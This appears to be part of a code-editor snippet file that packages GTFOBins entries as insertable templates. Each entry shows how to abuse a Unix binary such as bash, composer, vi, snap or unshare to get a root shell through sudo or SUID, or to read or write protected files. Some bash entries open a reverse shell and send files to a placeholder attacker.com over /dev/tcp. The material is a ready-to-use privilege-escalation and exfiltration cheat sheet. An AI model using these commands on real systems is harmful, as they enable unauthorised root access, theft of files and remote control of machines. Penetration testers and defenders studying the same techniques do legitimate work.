    "composer limited-suid (gtfobins)": {
        "prefix": "composer limited-suid",
        "body": [
            "abuse composer with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >\\$TF/composer.json",
            "./composer --working-dir=\\$TF run-script x${0}",
            "```"
        ],
        "description": "abuse composer with limited-suid"
    },
    "composer sudo (gtfobins)": {
        "prefix": "composer sudo",
        "body": [
            "abuse composer with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >\\$TF/composer.json",
            "sudo composer --working-dir=\\$TF run-script x${0}",
            "```"
        ],
        "description": "abuse composer with sudo"
    },
    "yash shell (gtfobins)": {
        "prefix": "yash shell",
        "body": [
            "abuse yash with shell",
            "",
            "```sh",
            "yash${0}",
            "```"
        ],
        "description": "abuse yash with shell"
    },
    "yash suid (gtfobins)": {
        "prefix": "yash suid",
        "body": [
            "abuse yash with suid",
            "",
            "```sh",
            "./yash${0}",
            "```"
        ],
        "description": "abuse yash with suid"
    },
    "yash sudo (gtfobins)": {
        "prefix": "yash sudo",
        "body": [
            "abuse yash with sudo",
            "",
            "```sh",
            "sudo yash${0}",
            "```"
        ],
        "description": "abuse yash with sudo"
    },
    "check_memory file-read (gtfobins)": {
        "prefix": "check_memory file-read",
        "body": [
            "abuse check_memory with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "check_memory --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_memory with file-read"
    },
    "check_memory sudo (gtfobins)": {
        "prefix": "check_memory sudo",
        "body": [
            "abuse check_memory with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo check_memory --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_memory with sudo"
    },
    "soelim file-read (gtfobins)": {
        "prefix": "soelim file-read",
        "body": [
            "abuse soelim with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "soelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse soelim with file-read"
    },
    "soelim suid (gtfobins)": {
        "prefix": "soelim suid",
        "body": [
            "abuse soelim with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./soelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse soelim with suid"
    },
    "soelim sudo (gtfobins)": {
        "prefix": "soelim sudo",
        "body": [
            "abuse soelim with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo soelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse soelim with sudo"
    },
    "look file-read (gtfobins)": {
        "prefix": "look file-read",
        "body": [
            "abuse look with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "look '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse look with file-read"
    },
    "look suid (gtfobins)": {
        "prefix": "look suid",
        "body": [
            "abuse look with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./look '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse look with suid"
    },
    "look sudo (gtfobins)": {
        "prefix": "look sudo",
        "body": [
            "abuse look with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo look '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse look with sudo"
    },
    "choom shell (gtfobins)": {
        "prefix": "choom shell",
        "body": [
            "abuse choom with shell",
            "",
            "```sh",
            "choom -n 0 /bin/sh${0}",
            "```"
        ],
        "description": "abuse choom with shell"
    },
    "choom suid (gtfobins)": {
        "prefix": "choom suid",
        "body": [
            "abuse choom with suid",
            "",
            "```sh",
            "./choom -n 0 -- /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse choom with suid"
    },
    "choom sudo (gtfobins)": {
        "prefix": "choom sudo",
        "body": [
            "abuse choom with sudo",
            "",
            "```sh",
            "sudo choom -n 0 /bin/sh${0}",
            "```"
        ],
        "description": "abuse choom with sudo"
    },
    "tmux file-read (gtfobins)": {
        "prefix": "tmux file-read",
        "body": [
            "abuse tmux with file-read, The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tmux -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse tmux with file-read - The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message."
    },
    "tmux shell (gtfobins)": {
        "prefix": "tmux shell",
        "body": [
            "abuse tmux with shell, Provided to have enough permissions to access the socket.",
            "",
            "```sh",
            "tmux -S /path/to/socket_name${0}",
            "```"
        ],
        "description": "abuse tmux with shell - Provided to have enough permissions to access the socket."
    },
    "tmux sudo (gtfobins)": {
        "prefix": "tmux sudo",
        "body": [
            "abuse tmux with sudo",
            "",
            "```sh",
            "sudo tmux${0}",
            "```"
        ],
        "description": "abuse tmux with sudo"
    },
    "bash shell (gtfobins)": {
        "prefix": "bash shell",
        "body": [
            "abuse bash with shell",
            "",
            "```sh",
            "bash${0}",
            "```"
        ],
        "description": "abuse bash with shell"
    },
    "bash reverse-shell (gtfobins)": {
        "prefix": "bash reverse-shell",
        "body": [
            "abuse bash with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "bash -c 'exec bash -i &>/dev/tcp/\\$RHOST/\\$RPORT <&1'${0}",
            "```"
        ],
        "description": "abuse bash with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "bash file-upload (gtfobins)": {
        "prefix": "bash file-upload",
        "body": [
            "abuse bash with file-upload, Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "bash -c 'cat \\$LFILE > /dev/tcp/\\$RHOST/\\$RPORT'${0}",
            "```"
        ],
        "description": "abuse bash with file-upload - Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "bash file-download (gtfobins)": {
        "prefix": "bash file-download",
        "body": [
            "abuse bash with file-download, Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "export LFILE=file_to_get",
            "bash -c 'cat < /dev/tcp/\\$RHOST/\\$RPORT > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse bash with file-download - Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file."
    },
    "bash file-write (gtfobins)": {
        "prefix": "bash file-write",
        "body": [
            "abuse bash with file-write, This adds timestamps to the output file.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "HISTIGNORE='history *'",
            "history -c",
            "DATA",
            "history -w \\$LFILE${0}",
            "```"
        ],
        "description": "abuse bash with file-write - This adds timestamps to the output file."
    },
    "bash file-read (gtfobins)": {
        "prefix": "bash file-read",
        "body": [
            "abuse bash with file-read, The read file content is surrounded by the current history content.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "HISTTIMEFORMAT=\\$'\\r\\e[K'",
            "history -r \\$LFILE",
            "history${0}",
            "```"
        ],
        "description": "abuse bash with file-read - The read file content is surrounded by the current history content."
    },
    "bash library-load (gtfobins)": {
        "prefix": "bash library-load",
        "body": [
            "abuse bash with library-load",
            "",
            "```sh",
            "bash -c 'enable -f ./lib.so x'${0}",
            "```"
        ],
        "description": "abuse bash with library-load"
    },
    "bash suid (gtfobins)": {
        "prefix": "bash suid",
        "body": [
            "abuse bash with suid",
            "",
            "```sh",
            "./bash -p${0}",
            "```"
        ],
        "description": "abuse bash with suid"
    },
    "bash sudo (gtfobins)": {
        "prefix": "bash sudo",
        "body": [
            "abuse bash with sudo",
            "",
            "```sh",
            "sudo bash${0}",
            "```"
        ],
        "description": "abuse bash with sudo"
    },
    "chown suid (gtfobins)": {
        "prefix": "chown suid",
        "body": [
            "abuse chown with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "./chown \\$(id -un):\\$(id -gn) \\$LFILE${0}",
            "```"
        ],
        "description": "abuse chown with suid"
    },
    "chown sudo (gtfobins)": {
        "prefix": "chown sudo",
        "body": [
            "abuse chown with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "sudo chown \\$(id -un):\\$(id -gn) \\$LFILE${0}",
            "```"
        ],
        "description": "abuse chown with sudo"
    },
    "unshare shell (gtfobins)": {
        "prefix": "unshare shell",
        "body": [
            "abuse unshare with shell",
            "",
            "```sh",
            "unshare /bin/sh${0}",
            "```"
        ],
        "description": "abuse unshare with shell"
    },
    "unshare suid (gtfobins)": {
        "prefix": "unshare suid",
        "body": [
            "abuse unshare with suid",
            "",
            "```sh",
            "./unshare -r /bin/sh${0}",
            "```"
        ],
        "description": "abuse unshare with suid"
    },
    "unshare sudo (gtfobins)": {
        "prefix": "unshare sudo",
        "body": [
            "abuse unshare with sudo",
            "",
            "```sh",
            "sudo unshare /bin/sh${0}",
            "```"
        ],
        "description": "abuse unshare with sudo"
    },
    "ln sudo (gtfobins)": {
        "prefix": "ln sudo",
        "body": [
            "abuse ln with sudo",
            "",
            "```sh",
            "sudo ln -fs /bin/sh /bin/ln",
            "sudo ln${0}",
            "```"
        ],
        "description": "abuse ln with sudo"
    },
    "torsocks shell (gtfobins)": {
        "prefix": "torsocks shell",
        "body": [
            "abuse torsocks with shell",
            "",
            "```sh",
            "torsocks /bin/sh${0}",
            "```"
        ],
        "description": "abuse torsocks with shell"
    },
    "torsocks sudo (gtfobins)": {
        "prefix": "torsocks sudo",
        "body": [
            "abuse torsocks with sudo",
            "",
            "```sh",
            "sudo torsocks /bin/sh${0}",
            "```"
        ],
        "description": "abuse torsocks with sudo"
    },
    "readelf file-read (gtfobins)": {
        "prefix": "readelf file-read",
        "body": [
            "abuse readelf with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "readelf -a @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse readelf with file-read"
    },
    "readelf suid (gtfobins)": {
        "prefix": "readelf suid",
        "body": [
            "abuse readelf with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./readelf -a @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse readelf with suid"
    },
    "readelf sudo (gtfobins)": {
        "prefix": "readelf sudo",
        "body": [
            "abuse readelf with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo readelf -a @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse readelf with sudo"
    },
    "runscript shell (gtfobins)": {
        "prefix": "runscript shell",
        "body": [
            "abuse runscript with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '! exec /bin/sh' >\\$TF",
            "runscript \\$TF${0}",
            "```"
        ],
        "description": "abuse runscript with shell"
    },
    "runscript limited-suid (gtfobins)": {
        "prefix": "runscript limited-suid",
        "body": [
            "abuse runscript with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '! exec /bin/sh' >\\$TF",
            "./runscript \\$TF${0}",
            "```"
        ],
        "description": "abuse runscript with limited-suid"
    },
    "runscript sudo (gtfobins)": {
        "prefix": "runscript sudo",
        "body": [
            "abuse runscript with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '! exec /bin/sh' >\\$TF",
            "sudo runscript \\$TF${0}",
            "```"
        ],
        "description": "abuse runscript with sudo"
    },
    "cut file-read (gtfobins)": {
        "prefix": "cut file-read",
        "body": [
            "abuse cut with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cut -d \"\" -f1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cut with file-read"
    },
    "cut suid (gtfobins)": {
        "prefix": "cut suid",
        "body": [
            "abuse cut with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./cut -d \"\" -f1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cut with suid"
    },
    "cut sudo (gtfobins)": {
        "prefix": "cut sudo",
        "body": [
            "abuse cut with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo cut -d \"\" -f1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cut with sudo"
    },
    "snap sudo (gtfobins)": {
        "prefix": "snap sudo",
        "body": [
            "abuse snap with sudo, \nIt runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nCOMMAND=id\n\ncd $(mktemp -d)\n\nmkdir -p meta/hooks\n\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\n\nchmod +x meta/hooks/install\n\nfpm -n xxxx -s dir -t snap -a all meta\n\n```\n",
            "",
            "```sh",
            "sudo snap install xxxx_1.0_all.snap --dangerous --devmode${0}",
            "```"
        ],
        "description": "abuse snap with sudo - \nIt runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nCOMMAND=id\n\ncd $(mktemp -d)\n\nmkdir -p meta/hooks\n\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\n\nchmod +x meta/hooks/install\n\nfpm -n xxxx -s dir -t snap -a all meta\n\n```\n"
    },
    "mv suid (gtfobins)": {
        "prefix": "mv suid",
        "body": [
            "abuse mv with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "./mv \\$TF \\$LFILE${0}",
            "```"
        ],
        "description": "abuse mv with suid"
    },
    "mv sudo (gtfobins)": {
        "prefix": "mv sudo",
        "body": [
            "abuse mv with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "sudo mv \\$TF \\$LFILE${0}",
            "```"
        ],
        "description": "abuse mv with sudo"
    },
    "perlbug shell (gtfobins)": {
        "prefix": "perlbug shell",
        "body": [
            "abuse perlbug with shell",
            "",
            "```sh",
            "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'${0}",
            "```"
        ],
        "description": "abuse perlbug with shell"
    },
    "perlbug sudo (gtfobins)": {
        "prefix": "perlbug sudo",
        "body": [
            "abuse perlbug with sudo",
            "",
            "```sh",
            "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'${0}",
            "```"
        ],
        "description": "abuse perlbug with sudo"
    },
    "vi shell (gtfobins)": {
        "prefix": "vi shell",
        "body": [
            "abuse vi with shell",
            "",
            "```sh",
            "vi",
            ":set shell=/bin/sh",
            ":shell${0}",
            "```"
        ],
        "description": "abuse vi with shell"
    },
    "vi file-write (gtfobins)": {
        "prefix": "vi file-write",
        "body": [
            "abuse vi with file-write",
            "",
            "```sh",
            "vi ${1:file_to_write}",
            "iDATA",
            "^[",
            "w${0}",
            "```"
        ],
        "description": "abuse vi with file-write"
    },
    "vi file-read (gtfobins)": {
        "prefix": "vi file-read",
        "body": [
            "abuse vi with file-read",
            "",
            "```sh",
            "vi ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse vi with file-read"
    },
    "vi sudo (gtfobins)": {
        "prefix": "vi sudo",
        "body": [
            "abuse vi with sudo",
            "",
            "```sh",
            "sudo vi -c ':!/bin/sh' /dev/null${0}",
            "```"
        ],
        "description": "abuse vi with sudo"
    },
    "neofetch shell (gtfobins)": {
        "prefix": "neofetch shell",
        "body": [
            "abuse neofetch with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec /bin/sh' >\\$TF",
            "neofetch --config \\$TF${0}",
            "```"
        ],
        "description": "abuse neofetch with shell"
    },
    "neofetch file-read (gtfobins)": {
        "prefix": "neofetch file-read",
        "body": [
            "abuse neofetch with file-read, The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "neofetch --ascii \\$LFILE${0}",
            "```"
        ],
        "description": "abuse neofetch with file-read - The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files."
    },
    "neofetch sudo (gtfobins)": {
        "prefix": "neofetch sudo",
        "body": [
            "abuse neofetch with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec /bin/sh' >\\$TF",
            "sudo neofetch --config \\$TF${0}",
            "```"
        ],
        "description": "abuse neofetch with sudo"
    },
    "valgrind shell (gtfobins)": {
        "prefix": "valgrind shell",
        "body": [
            "abuse valgrind with shell",
            "",
            "```sh",
            "valgrind /bin/sh${0}",
            "```"
        ],
        "description": "abuse valgrind with shell"
    },
    "valgrind sudo (gtfobins)": {
        "prefix": "valgrind sudo",
        "body": [
            "abuse valgrind with sudo",
            "",
            "```sh",
            "sudo valgrind /bin/sh${0}",
            "```"
        ],
        "description": "abuse valgrind with sudo"
    },
    "bzip2 file-read (gtfobins)": {
        "prefix": "bzip2 file-read",
        "body": [
            "abuse bzip2 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "bzip2 -c \\$LFILE | bzip2 -d${0}",
            "```"
        ],
        "description": "abuse bzip2 with file-read"
    },
    "bzip2 suid (gtfobins)": {
        "prefix": "bzip2 suid",
        "body": [
            "abuse bzip2 with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./bzip2 -c \\$LFILE | bzip2 -d${0}",
            "```"
        ],
        "description": "abuse bzip2 with suid"
    },
    "bzip2 sudo (gtfobins)": {
        "prefix": "bzip2 sudo",
        "body": [
            "abuse bzip2 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo bzip2 -c \\$LFILE | bzip2 -d${0}",
            "```"
        ],
        "description": "abuse bzip2 with sudo"
    },
    "latexmk shell (gtfobins)": {
        "prefix": "latexmk shell",
        "body": [
            "abuse latexmk with shell",
            "",
            "```sh",
            "latexmk -latex='/bin/sh #' /dev/null${0}",
            "```"
        ],
        "description": "abuse latexmk with shell"
    },
    "latexmk file-read (gtfobins)": {
        "prefix": "latexmk file-read",
        "body": [
            "abuse latexmk with file-read, The read file will be part of the output.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{${1:file_to_read}}\\end{document}' >\\$TF",
            "strings tmp.dvi${0}",
            "```"
        ],
        "description": "abuse latexmk with file-read - The read file will be part of the output."
    },
    "latexmk sudo (gtfobins)": {
        "prefix": "latexmk sudo",
        "body": [
            "abuse latexmk with sudo",
            "",
            "```sh",
            "sudo latexmk -e 'exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse latexmk with sudo"
    },
    "lwp-download file-download (gtfobins)": {
        "prefix": "lwp-download file-download",
        "body": [
            "abuse lwp-download with file-download",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "lwp-download \\$URL \\$LFILE${0}",
            "```"
        ],
        "description": "abuse lwp-download with file-download"
    },
    "lwp-download sudo (gtfobins)": {
        "prefix": "lwp-download sudo",
        "body": [
            "abuse lwp-download with sudo",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "sudo lwp-download \\$URL \\$LFILE${0}",
            "```"
        ],
        "description": "abuse lwp-download with sudo"
    },
    "lwp-download file-read (gtfobins)": {
        "prefix": "lwp-download file-read",
        "body": [
            "abuse lwp-download with file-read, The file path must be absolute.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp)",
            "lwp-download \"file://\\$LFILE\" \\$TF",
            "cat \\$TF${0}",
            "```"
        ],
        "description": "abuse lwp-download with file-read - The file path must be absolute."
    },
    "lwp-download file-write (gtfobins)": {
        "prefix": "lwp-download file-write",
        "body": [
            "abuse lwp-download with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "lwp-download file://\\$TF \\$LFILE${0}",
            "```"
        ],
        "description": "abuse lwp-download with file-write"
    },
    "ssh-keygen library-load (gtfobins)": {
        "prefix": "ssh-keygen library-load",
        "body": [
            "abuse ssh-keygen with library-load",
            "",
            "```sh",
            "ssh-keygen -D ./lib.so${0}",
            "```"
        ],
        "description": "abuse ssh-keygen with library-load"
    },
    "ssh-keygen sudo (gtfobins)": {
        "prefix": "ssh-keygen sudo",
        "body": [
            "abuse ssh-keygen with sudo",
            "",
            "```sh",
            "sudo ssh-keygen -D ./lib.so${0}",
            "```"
        ],
        "description": "abuse ssh-keygen with sudo"
    },
    "ssh-keygen suid (gtfobins)": {
        "prefix": "ssh-keygen suid",
        "body": [
            "abuse ssh-keygen with suid",
            "",
            "```sh",
            "./ssh-keygen -D ./lib.so${0}",
            "```"
        ],
        "description": "abuse ssh-keygen with suid"
    },
    "crontab command (gtfobins)": {
        "prefix": "crontab command",
        "body": [
            "abuse crontab with command, The commands are executed according to the crontab file edited via the `crontab` utility.",
            "",
            "```sh",
            "crontab -e${0}",
            "```"
        ],
        "description": "abuse crontab with command - The commands are executed according to the crontab file edited via the `crontab` utility."
    },
    "crontab sudo (gtfobins)": {
        "prefix": "crontab sudo",
        "body": [
            "abuse crontab with sudo, The commands are executed according to the crontab file edited via the `crontab` utility.",
            "",
            "```sh",
            "sudo crontab -e${0}",
            "```"
        ],
        "description": "abuse crontab with sudo - The commands are executed according to the crontab file edited via the `crontab` utility."
    },
    "basez file-read (gtfobins)": {
        "prefix": "basez file-read",
        "body": [
            "abuse basez with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "basez \"\\$LFILE\" | basez --decode${0}",
            "```"
        ],
        "description": "abuse basez with file-read"
    },
    "basez suid (gtfobins)": {
        "prefix": "basez suid",
        "body": [
            "abuse basez with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./basez \"\\$LFILE\" | basez --decode${0}",
            "```"
        ],
        "description": "abuse basez with suid"
    },
    "basez sudo (gtfobins)": {
        "prefix": "basez sudo",
        "body": [
            "abuse basez with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo basez \"\\$LFILE\" | basez --decode${0}",
            "```"
        ],
        "description": "abuse basez with sudo"
    },
    "wireshark command (gtfobins)": {
        "prefix": "wireshark command",
        "body": [
            "abuse wireshark with command, \nThis requires GUI interaction. Start Wireshark, then from the main menu, select \"Tools\" -> \"Lua\" -> \"Evaluate\". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.\n",
            "",
            "```sh",
            "wireshark${0}",
            "```"
        ],
        "description": "abuse wireshark with command - \nThis requires GUI interaction. Start Wireshark, then from the main menu, select \"Tools\" -> \"Lua\" -> \"Evaluate\". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.\n"
    },
    "wireshark sudo (gtfobins)": {
        "prefix": "wireshark sudo",
        "body": [
            "abuse wireshark with sudo, \nThis technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\n\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:\n\n\n\n1. select the only received packet;\n\n\n\n2. right-click on \"Data\" from the \"Packet Details\" pane, and select \"Export Packet Bytes...\";\n\n\n\n3. choose where to save the packet dump.\n",
            "",
            "```sh",
            "PORT=4444",
            "sudo wireshark -c 1 -i lo -k -f \"udp port \\$PORT\" &",
            "echo 'DATA' | nc -u 127.127.127.127 \"\\$PORT\"${0}",
            "```"
        ],
        "description": "abuse wireshark with sudo - \nThis technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\n\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:\n\n\n\n1. select the only received packet;\n\n\n\n2. right-click on \"Data\" from the \"Packet Details\" pane, and select \"Export Packet Bytes...\";\n\n\n\n3. choose where to save the packet dump.\n"
    }
}